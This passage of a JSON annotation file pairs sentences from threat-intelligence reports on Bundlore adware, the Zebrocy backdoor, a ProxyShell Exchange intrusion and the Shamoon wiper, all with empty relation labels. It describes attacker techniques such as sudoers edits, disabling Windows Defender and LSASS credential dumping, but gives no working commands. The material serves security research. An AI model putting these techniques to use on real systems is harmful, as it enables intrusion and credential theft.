        "id": "cti_reports_filtered/r-885.md::S28<=>S34",
        "S1": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "S2": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S30<=>S34",
        "S1": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "S2": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S31<=>S49",
        "S1": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:",
        "S2": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S34<=>S54",
        "S1": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S36<=>S52",
        "S1": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "S2": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S37<=>S39",
        "S1": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "S2": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S38<=>S56",
        "S1": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:",
        "S2": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S44<=>S52",
        "S1": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)",
        "S2": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S49<=>S72",
        "S1": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "S2": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S50<=>S54",
        "S1": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S52<=>S54",
        "S1": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S54<=>S58",
        "S1": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "S2": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S54<=>S56",
        "S1": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "S2": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S56<=>S68",
        "S1": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "S2": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S58<=>S60",
        "S1": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "S2": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S59<=>S62",
        "S1": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.",
        "S2": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S60<=>S63",
        "S1": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "S2": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S61<=>S80",
        "S1": "This script is configured to install different products depending on what is retrieved from the server.",
        "S2": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S63<=>S65",
        "S1": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "S2": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S68<=>S72",
        "S1": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "S2": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S72<=>S81",
        "S1": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "S2": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S74<=>S78",
        "S1": "According to Chrome documentation:",
        "S2": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S80<=>S84",
        "S1": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "S2": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S81<=>S84",
        "S1": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "S2": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S85<=>S87",
        "S1": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "S2": "Existing customers can learn more about how VMware Carbon Black products protect against this variant of Bundlore by visiting our \u201cBundlore (macOS) mm-install-macos\u201d TAU-TIN hosted on the User Exchange.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S0<=>S3",
        "S1": "At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components.",
        "S2": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S3<=>S21",
        "S1": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "S2": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S5<=>S10",
        "S1": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "S2": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S10<=>S13",
        "S1": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "S2": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S14<=>S18",
        "S1": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "S2": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S17<=>S19",
        "S1": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "S2": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S18<=>S24",
        "S1": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S19<=>S21",
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S19<=>S24",
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S19<=>S32",
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S21<=>S24",
        "S1": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S22<=>S24",
        "S1": "Hence, the time between the victim running the downloader and the operators\u2019 first commands",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S24<=>S27",
        "S1": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "S2": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S24<=>S26",
        "S1": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "S2": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S25<=>S27",
        "S1": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "S2": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S26<=>S40",
        "S1": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "S2": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S27<=>S32",
        "S1": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "S2": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S27<=>S29",
        "S1": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "S2": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S30<=>S34",
        "S1": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "S2": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S32<=>S34",
        "S1": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "S2": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S35<=>S41",
        "S1": "The current dumpers have some similarities with those previously used by the group.",
        "S2": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S35<=>S37",
        "S1": "The current dumpers have some similarities with those previously used by the group.",
        "S2": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S37<=>S39",
        "S1": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "S2": "These dumpers are quickly removed once they have done their job.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S44<=>S47",
        "S1": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "S2": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S45<=>S47",
        "S1": "This backdoor is executed using the CMD_EXECUTE command:",
        "S2": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S48<=>S50",
        "S1": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "S2": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md::S50<=>S52",
        "S1": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "S2": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S1<=>S5",
        "S1": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
        "S2": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S2<=>S6",
        "S1": "Soon after, they established two persistence methods.",
        "S2": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S5<=>S8",
        "S1": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "S2": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S6<=>S69",
        "S1": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "S2": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S7<=>S10",
        "S1": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
        "S2": "Two days later, we saw the threat actors reappear.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S8<=>S14",
        "S1": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "S2": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S8<=>S20",
        "S1": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "S2": "This activity then repeated approximately 2 days after the initial exploitation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S13<=>S56",
        "S1": "No further activity was observed as the threat actors were evicted from the network.",
        "S2": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S14<=>S16",
        "S1": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "S2": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S15<=>S21",
        "S1": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "S2": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S15<=>S31",
        "S1": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "S2": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S17<=>S19",
        "S1": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "S2": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S19<=>S21",
        "S1": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "S2": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S20<=>S50",
        "S1": "This activity then repeated approximately 2 days after the initial exploitation.",
        "S2": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S21<=>S33",
        "S1": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "S2": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S31<=>S33",
        "S1": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "S2": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S31<=>S51",
        "S1": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "S2": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S33<=>S37",
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S33<=>S43",
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S33<=>S52",
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "Below, we can observe the content of wininet.xml:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S34<=>S38",
        "S1": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "S2": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S34<=>S56",
        "S1": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "S2": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S37<=>S51",
        "S1": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "S2": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S44<=>S46",
        "S1": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.",
        "S2": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S45<=>S49",
        "S1": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
        "S2": "The threat actors ran the same command again two days later:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S47<=>S49",
        "S1": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "S2": "The threat actors ran the same command again two days later:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S50<=>S63",
        "S1": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "S2": "The threat actor enabled WDigest authentication.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S50<=>S81",
        "S1": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "S2": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S51<=>S53",
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "The following commands where then ran to initiate the task and to achieve persistence:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S51<=>S54",
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "The scheduled task created by the web shell was set to use",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S51<=>S81",
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S54<=>S71",
        "S1": "The scheduled task created by the web shell was set to use",
        "S2": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S56<=>S69",
        "S1": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "S2": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S63<=>S66",
        "S1": "The threat actor enabled WDigest authentication.",
        "S2": "The threat actor created a process memory dump from LSASS.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S67<=>S71",
        "S1": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "S2": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S70<=>S72",
        "S1": "They executed commands such as:",
        "S2": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S72<=>S80",
        "S1": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S73<=>S75",
        "S1": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "S2": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md::S78<=>S80",
        "S1": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S0<=>S3",
        "S1": "Shamoon is a dropper that carries three resources.",
        "S2": "It decrypts the three resources and installs them on the system in the %System% folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S4<=>S6",
        "S1": "It also creates the service MaintenaceSrv, which runs the wiper.",
        "S2": "The Advanced Threat Research team has watched this service evolve over the years.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S4<=>S8",
        "S1": "It also creates the service MaintenaceSrv, which runs the wiper.",
        "S2": "The wiper uses ElRawDisk.sys to access the user\u2019s raw disk and overwrites all data in all folders and disk sectors, causing a critical state of the infected machine before it finally reboots.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S4<=>S10",
        "S1": "It also creates the service MaintenaceSrv, which runs the wiper.",
        "S2": "The dropper contains other malicious components masked as encrypted files embedded in PE section.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S6<=>S28",
        "S1": "The Advanced Threat Research team has watched this service evolve over the years.",
        "S2": "We also observed that in some cases the date is briefly modified on the system, faking the date of each file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S10<=>S23",
        "S1": "The dropper contains other malicious components masked as encrypted files embedded in PE section.",
        "S2": "It then retrieves the resources within the PE file to drop the components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S11<=>S23",
        "S1": "These resources are decrypted by the dropper and contain:",
        "S2": "It then retrieves the resources within the PE file to drop the components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S11<=>S15",
        "S1": "These resources are decrypted by the dropper and contain:",
        "S2": "Shamoon 2018 needs an argument to run and infect machines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S17<=>S19",
        "S1": "It also drops the file key8854321.pub (MD5: 41f8cd9ac3fb6b1771177e5770537518) in the folder c:\\Windows\\Temp\\key8854321.pub.",
        "S2": "Shamoon enables the service RemoteRegistry, which allows a program to remotely modify the registry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S18<=>S21",
        "S1": "The malware decrypts two files used later:",
        "S2": "The malware checks whether the following shares exist to copy itself and spread:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S19<=>S22",
        "S1": "Shamoon enables the service RemoteRegistry, which allows a program to remotely modify the registry.",
        "S2": "Shamoon queries the service to retrieve specific information related to the LocalService account.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S20<=>S22",
        "S1": "It also disables remote user account control by enabling the registry key LocalAccountTokenFilterPolicy.",
        "S2": "Shamoon queries the service to retrieve specific information related to the LocalService account.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S21<=>S50",
        "S1": "The malware checks whether the following shares exist to copy itself and spread:",
        "S2": "The malware overwrites every file in c:\\Windows\\System32, placing the machine in a critical state.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S23<=>S25",
        "S1": "It then retrieves the resources within the PE file to drop the components.",
        "S2": "Shamoon creates the file and sets the time to August 2012 as an antiforensic trick.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S26<=>S30",
        "S1": "It puts this date on any file it can destroy.",
        "S2": "Before creating the malicious service, Shamoon elevates its privilege by impersonating the token.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S26<=>S28",
        "S1": "It puts this date on any file it can destroy.",
        "S2": "We also observed that in some cases the date is briefly modified on the system, faking the date of each file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S28<=>S58",
        "S1": "We also observed that in some cases the date is briefly modified on the system, faking the date of each file.",
        "S2": "We noticed the capability to scan for the local network and connect to a potential control server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S31<=>S34",
        "S1": "It first uses LogonUser and ImpersonateLoggedOnUser, then ImpersonateNamedPipeClient.",
        "S2": "Shamoon creates the new malicious service MaintenaceSrv.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S42<=>S47",
        "S1": "The wiper driver is embedded in its resources.",
        "S2": "The wiper creates a service to run the driver with the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S43<=>S46",
        "S1": "We can see the encrypted resources, 101, in this screenshot:",
